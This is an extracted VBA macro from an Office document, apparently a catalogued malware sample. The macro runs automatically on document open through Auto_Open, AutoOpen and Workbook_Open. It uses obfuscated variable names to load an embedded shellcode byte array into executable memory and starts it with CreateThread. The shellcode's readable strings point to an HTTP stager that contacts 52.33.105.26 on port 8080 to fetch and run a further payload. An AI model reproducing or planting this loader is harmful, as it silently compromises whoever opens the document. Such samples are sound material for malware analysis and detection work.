Attribute VB_Name = "NewMacros"
#If VBA7 Then
    Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Mfiipuikv As Long, ByVal Xatdd As Long, ByVal Kerzrk As LongPtr, Dhuluiea As Long, ByVal Andvlbmq As Long, Cdypav As Long) As LongPtr
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Vazn As Long, ByVal Tzotdmxm As Long, ByVal Knsu As Long, ByVal Rzepvlkxp As Long) As LongPtr
    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Kadlfe As LongPtr, ByRef Mewl As Any, ByVal Gigzfyz As Long) As LongPtr
#Else
    Private Declare Function CreateThread Lib "kernel32" (ByVal Mfiipuikv As Long, ByVal Xatdd As Long, ByVal Kerzrk As Long, Dhuluiea As Long, ByVal Andvlbmq As Long, Cdypav As Long) As Long
    Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Vazn As Long, ByVal Tzotdmxm As Long, ByVal Knsu As Long, ByVal Rzepvlkxp As Long) As Long
    Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Kadlfe As Long, ByRef Mewl As Any, ByVal Gigzfyz As Long) As Long
#End If

Sub Auto_Open()
    Dim Fbhludj As Long, Usqmjh As Variant, Aglmjre As Long
#If VBA7 Then
    Dim Qbdumfpl As LongPtr, Daacwvyrf As LongPtr
#Else
    Dim Qbdumfpl As Long, Daacwvyrf As Long
#End If
    Usqmjh = Array(232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 226, 242, 82, 87, 139, 82, 16, 139, 74, 60, 139, 76, 17, 120, 227, 72, 1, 209, 81, 139, 89, 32, 1, 211, 139, 73, 24, 227, 58, 73, 139, 52, 139, 1, 214, 49, 255, 172, 193, _
207, 13, 1, 199, 56, 224, 117, 246, 3, 125, 248, 59, 125, 36, 117, 228, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 95, 95, 90, 139, 18, 235, 141, 93, 104, 110, 101, 116, 0, 104, 119, 105, 110, 105, 84, 104, 76, 119, 38, 7, 255, 213, 49, 219, 83, 83, 83, 83, _
83, 232, 62, 0, 0, 0, 77, 111, 122, 105, 108, 108, 97, 47, 53, 46, 48, 32, 40, 87, 105, 110, 100, 111, 119, 115, 32, 78, 84, 32, 54, 46, 49, 59, 32, 84, 114, 105, 100, 101, 110, 116, 47, 55, 46, 48, 59, 32, 114, 118, 58, 49, 49, 46, 48, 41, 32, 108, 105, 107, 101, 32, 71, 101, 99, 107, 111, 0, 104, 58, 86, 121, 167, 255, 213, 83, 83, 106, 3, 83, _
83, 104, 144, 31, 0, 0, 232, 216, 0, 0, 0, 47, 70, 86, 79, 120, 76, 84, 95, 105, 121, 49, 99, 66, 103, 103, 67, 68, 88, 52, 118, 95, 70, 81, 119, 107, 78, 67, 76, 79, 53, 68, 88, 66, 100, 104, 73, 50, 80, 76, 50, 122, 71, 45, 68, 81, 106, 102, 68, 49, 73, 74, 104, 111, 66, 71, 52, 103, 80, 118, 121, 115, 53, 81, 77, 117, 99, 51, 66, 105, _
109, 98, 95, 0, 80, 104, 87, 137, 159, 198, 255, 213, 137, 198, 83, 104, 0, 50, 224, 132, 83, 83, 83, 87, 83, 86, 104, 235, 85, 46, 59, 255, 213, 150, 106, 10, 95, 104, 128, 51, 0, 0, 137, 224, 106, 4, 80, 106, 31, 86, 104, 117, 70, 158, 134, 255, 213, 83, 83, 83, 83, 86, 104, 45, 6, 24, 123, 255, 213, 133, 192, 117, 20, 104, 136, 19, 0, 0, 104, 68, _
240, 53, 224, 255, 213, 79, 117, 205, 232, 73, 0, 0, 0, 106, 64, 104, 0, 16, 0, 0, 104, 0, 0, 64, 0, 83, 104, 88, 164, 83, 229, 255, 213, 147, 83, 83, 137, 231, 87, 104, 0, 32, 0, 0, 83, 86, 104, 18, 150, 137, 226, 255, 213, 133, 192, 116, 207, 139, 7, 1, 195, 133, 192, 117, 229, 88, 195, 95, 232, 107, 255, 255, 255, 53, 50, 46, 51, 51, 46, 49, _
48, 53, 46, 50, 54, 0, 187, 240, 181, 162, 86, 106, 0, 83, 255, 213)

    Qbdumfpl = VirtualAlloc(0, UBound(Usqmjh), &H1000, &H40)
    For Aglmjre = LBound(Usqmjh) To UBound(Usqmjh)
        Fbhludj = Usqmjh(Aglmjre)
        Daacwvyrf = RtlMoveMemory(Qbdumfpl + Aglmjre, Fbhludj, 1)
    Next Aglmjre
    Daacwvyrf = CreateThread(0, 0, Qbdumfpl, 0, 0, 0)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub

Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True


INQUEST-PP=macro
